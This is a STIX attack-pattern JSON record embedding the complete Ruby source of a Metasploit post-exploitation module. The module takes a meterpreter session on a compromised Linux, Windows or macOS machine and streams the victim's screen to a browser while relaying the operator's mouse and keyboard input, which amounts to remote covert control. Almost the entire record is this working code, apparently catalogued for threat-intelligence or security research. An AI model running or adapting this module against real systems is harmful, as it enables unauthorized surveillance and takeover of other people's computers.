{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--02d0c566-73d1-4191-977b-f0caa8af489f",
    "created": "2024-08-14T16:33:18.007453Z",
    "modified": "2024-08-14T16:33:18.007457Z",
    "name": "Multi Manage the screen of the target meterpreter session",
    "description": " This module allows you to view and control the screen of the target computer via a local browser window. The module continually screenshots the target screen and also relays all mouse and keyboard events to session.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/manage/screenshare.rb",
            "external_id": "screenshare.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  include Msf::Exploit::Remote::HttpServer\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multi Manage the screen of the target meterpreter session',\n        'Description' => %q{\n          This module allows you to view and control the screen of the target computer via\n          a local browser window. The module continually screenshots the target screen and\n          also relays all mouse and keyboard events to session.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'timwr'],\n        'Platform' => [ 'linux', 'win', 'osx' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'DefaultOptions' => { 'SRVHOST' => '127.0.0.1' },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_ui_desktop_screenshot\n              stdapi_ui_send_keyevent\n              stdapi_ui_send_mouse\n            ]\n          }\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n  end\n\n  def run\n    @last_sequence = 0\n    @key_sequence = {}\n    exploit\n  end\n\n  def perform_event(query)\n    action = query['action']\n\n    if action == 'key'\n      key = query['key']\n      keyaction = query['keyaction']\n      session.ui.keyevent_send(key, keyaction) if key\n    else\n      x = query['x']\n      y = query['y']\n      session.ui.mouse(action, x, y)\n    end\n  end\n\n  def supports_espia?(session)\n    return false unless session.platform == 'windows'\n\n    session.core.use('espia') unless session.espia\n    session.espia.present?\n  rescue RuntimeError\n    false\n  end\n\n  # rubocop:disable Metrics/MethodLength\n  def on_request_uri(cli, request)\n    if request.uri =~ %r{/screenshot$}\n      data = ''\n      if supports_espia?(session)\n        data = session.espia.espia_image_get_dev_screen\n      else\n        data = session.ui.screenshot(50)\n      end\n      send_response(cli, data, { 'Content-Type' => 'image/jpeg', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache' })\n    elsif request.uri =~ %r{/event$}\n      query = JSON.parse(request.body)\n      seq = query['i']\n      if seq <= @last_sequence + 1\n        perform_event(query)\n        @last_sequence = seq\n      else\n        @key_sequence[seq] = query\n      end\n      loop do\n        event = @key_sequence[@last_sequence + 1]\n        break unless event\n\n        perform_event(event)\n        @last_sequence += 1\n        @key_sequence.delete(@last_sequence)\n      end\n\n      send_response(cli, '')\n    else\n      print_status(\"Sent screenshare html to #{cli.peerhost}\")\n      uripath = get_resource\n      uripath += '/' unless uripath.end_with? '/'\n      html = %^<!html>\n<head>\n<META HTTP-EQUIV=\"PRAGMA\" CONTENT=\"NO-CACHE\">\n<META HTTP-EQUIV=\"CACHE-CONTROL\" CONTENT=\"NO-CACHE\">\n<title>Metasploit screenshare</title>\n</head>\n<body>\n<noscript>\n<h2 style=\"color:#f00\">Error: You need JavaScript enabled to watch the stream.</h2>\n</noscript>\n<div id=\"error\" style=\"display: none\">\n  An error occurred when loading the latest screen share.\n</div>\n<div id=\"container\">\n  <div class=\"controls\">\n    <span>\n      <label for=\"isControllingCheckbox\">Controlling target?</label>\n      <input type=\"checkbox\" id=\"isControllingCheckbox\" name=\"scales\">\n    </span>\n    <span>\n      <label for=\"screenScaleFactorInput\">Screen size</label>\n      <input type=\"range\" id=\"screenScaleFactorInput\" min=\"0.01\" max=\"2\" step=\"0.01\" />\n    </span>\n    <span>\n      <label for=\"refreshRateInput\">Image delay</label>\n      <input type=\"range\" id=\"imageDelayInput\" min=\"16\" max=\"60000\" step=\"1\" />\n      <span id=\"imageDelayLabel\" />\n    </span>\n  </div>\n  <canvas id=\"canvas\" />\n</div>\n<div>\n  <a href=\"https://www.metasploit.com\" target=\"_blank\">www.metasploit.com</a>\n</div>\n</body>\n<script type=\"text/javascript\">\n\"use strict\";\n\nvar state = {\n  eventCount: 1,\n  isControlling: false,\n  // 1 being original size, 0.5 half size, 2 being twice as large\n  screenScaleFactor: 1,\n  // In milliseconds, 1 capture every 60 seconds\n  imageDelay: 60000,\n};\n\nvar container = document.getElementById(\"container\");\nvar error = document.getElementById(\"error\");\nvar img = new Image();\nvar controllingCheckbox = document.getElementById(\"isControllingCheckbox\");\nvar imageDelayInput = document.getElementById(\"imageDelayInput\");\nvar imageDelayLabel = document.getElementById(\"imageDelayLabel\");\nvar screenScaleFactorInput = document.getElementById(\"screenScaleFactorInput\");\nvar canvas = document.getElementById(\"canvas\");\nvar ctx = canvas.getContext(\"2d\");\n\n/////////////////////////////////////////////////////////////////////////////\n// Form binding\n/////////////////////////////////////////////////////////////////////////////\n\nsetTimeout(synchronizeState, 0);\n\ncontrollingCheckbox.onclick = function () {\n  state.isControlling = controllingCheckbox.checked;\n  synchronizeState();\n};\n\nimageDelayInput.oninput = function (e) {\n  state.imageDelay = Number(e.target.value);\n  synchronizeState();\n};\n\nscreenScaleFactorInput.oninput = function (e) {\n  state.screenScaleFactor = Number(e.target.value);\n  synchronizeState();\n};\n\nfunction synchronizeState() {\n  screenScaleFactorInput.value = state.screenScaleFactor;\n  imageDelayInput.value = state.imageDelay;\n  imageDelayLabel.innerHTML = state.imageDelay + \" milliseconds\";\n  controllingCheckbox.checked = state.isControlling;\n  scheduler.setDelay(state.imageDelay);\n  updateCanvas();\n}\n\n/////////////////////////////////////////////////////////////////////////////\n// Canvas Refeshing\n/////////////////////////////////////////////////////////////////////////////\n\n// Schedules the queued function to be invoked after the required period of delay.\n// If a queued function is originally queued for a delay of one minute, followed\n// by an updated delay of 1000ms, the previous delay will be ignored - and the\n// required function will instead be invoked 1 second later as requested.\nfunction Scheduler(initialDay) {\n  var previousTimeoutId = null;\n  var delay = initialDay;\n  var previousFunc = null;\n\n  this.setDelay = function (value) {\n    if (value === delay) return;\n    delay = value;\n    this.queue(previousFunc);\n  };\n\n  this.queue = function (func) {\n    clearTimeout(previousTimeoutId);\n    previousTimeoutId = setTimeout(func, delay);\n    previousFunc = func;\n  };\n\n  return this;\n}\nvar scheduler = new Scheduler(state.imageDelay);\n\nfunction updateCanvas() {\n  canvas.width = img.width * state.screenScaleFactor;\n  canvas.height = img.height * state.screenScaleFactor;\n  ctx.drawImage(img, 0, 0, canvas.width, canvas.height);\n\n  error.style = \"display: none\";\n}\n\nfunction showError() {\n  error.style = \"display: initial\";\n}\n\n// Fetches the latest image, and queues an additional image refresh once complete\nfunction fetchLatestImage() {\n  var nextImg = new Image();\n  nextImg.onload = function () {\n    img = nextImg;\n    updateCanvas();\n    scheduler.queue(fetchLatestImage);\n  };\n  nextImg.onerror = function () {\n    showError();\n    scheduler.queue(fetchLatestImage);\n  };\n  nextImg.src = \"#{uripath}screenshot#\" + Date.now();\n}\n\nfetchLatestImage();\n\n/////////////////////////////////////////////////////////////////////////////\n// Canvas interaction\n/////////////////////////////////////////////////////////////////////////////\n\n// Returns a function, that when invoked, will only run at most once within\n// the required timeframe. This reduces the rate at which a function will be\n// called. Particularly useful for reducing the amount of mouse movement events.\nfunction throttle(func, limit) {\n  limit = limit || 200;\n  var timeoutId;\n  var previousTime;\n  var context;\n  var args;\n  return function () {\n    context = this;\n    args = arguments;\n    if (!previousTime) {\n      func.apply(context, args);\n      previousTime = Date.now();\n    } else {\n      clearTimeout(timeoutId);\n      timeoutId = setTimeout(function () {\n        if (Date.now() - previousTime >= limit) {\n          func.apply(context, args);\n          previousTime = Date.now();\n        }\n      }, limit - (Date.now() - previousTime));\n    }\n  };\n}\n\nfunction sendEvent(event) {\n  if (!state.isControlling) {\n    return;\n  }\n\n  event[\"i\"] = state.eventCount++;\n  var req = new XMLHttpRequest();\n  req.open(\"POST\", \"#{uripath}event\", true);\n  req.setRequestHeader(\"Content-type\", 'application/json;charset=UTF-8');\n  req.send(JSON.stringify(event));\n}\n\nfunction mouseEvent(action, e) {\n  sendEvent({\n    action: action,\n    // Calculate mouse position relative to the original screensize\n    x: Math.round(\n      (e.pageX - canvas.offsetLeft) * (1 / state.screenScaleFactor)\n    ),\n    y: Math.round(\n      (e.pageY - canvas.offsetTop) * (1 / state.screenScaleFactor)\n    ),\n  });\n}\n\nfunction keyEvent(action, key) {\n  if (key === 59) {\n    key = 186;\n  } else if (key === 61) {\n    key = 187;\n  } else if (key === 173) {\n    key = 189;\n  }\n  sendEvent({\n    action: \"key\",\n    keyaction: action,\n    key: key,\n  });\n}\n\ndocument.onkeydown = throttle(function (e) {\n  if (!state.isControlling) {\n    return;\n  }\n  var key = e.which || e.keyCode;\n  keyEvent(1, key);\n  e.preventDefault();\n});\n\ndocument.onkeyup = function (e) {\n  if (!state.isControlling) {\n    return;\n  }\n  var key = e.which || e.keyCode;\n  keyEvent(2, key);\n  e.preventDefault();\n};\n\ncanvas.addEventListener(\n  \"contextmenu\",\n  function (e) {\n    if (!state.isControlling) {\n      return;\n    }\n    e.preventDefault();\n  },\n  false\n);\n\ncanvas.onmousemove = throttle(function (e) {\n  if (!state.isControlling) {\n    return;\n  }\n  mouseEvent(\"move\", e);\n  e.preventDefault();\n});\n\ncanvas.onmousedown = function (e) {\n  if (!state.isControlling) {\n    return;\n  }\n  var action = \"leftdown\";\n  if (e.which === 3) {\n    action = \"rightdown\";\n  }\n  mouseEvent(action, e);\n  e.preventDefault();\n};\n\ncanvas.onmouseup = function (e) {\n  if (!state.isControlling) {\n    return;\n  }\n  var action = \"leftup\";\n  if (e.which === 3) {\n    action = \"rightup\";\n  }\n  mouseEvent(action, e);\n  e.preventDefault();\n};\n\ncanvas.ondblclick = function (e) {\n  if (!state.isControlling) {\n    return;\n  }\n  mouseEvent(\"doubleclick\", e);\n  e.preventDefault();\n};\n</script>\n<style>\nbody {\n  color: rgba(0, 0, 0, .85);\n  font-size: 16px;\n}\n\ninput {\n  padding: 0.5em 0.6em;\n  display: inline-block;\n  vertical-align: middle;\n  -webkit-box-sizing: border-box;\n  box-sizing: border-box;\n}\n\n.controls {\n  line-height: 2;\n}\n</style>\n</html>\n    ^\n      send_response(cli, html, { 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0' })\n    end\n  end\n  # rubocop:enable Metrics/MethodLength\nend\n",
    "x_mitre_platforms": [
        "[ 'linux', 'win', 'osx' ]"
    ]
}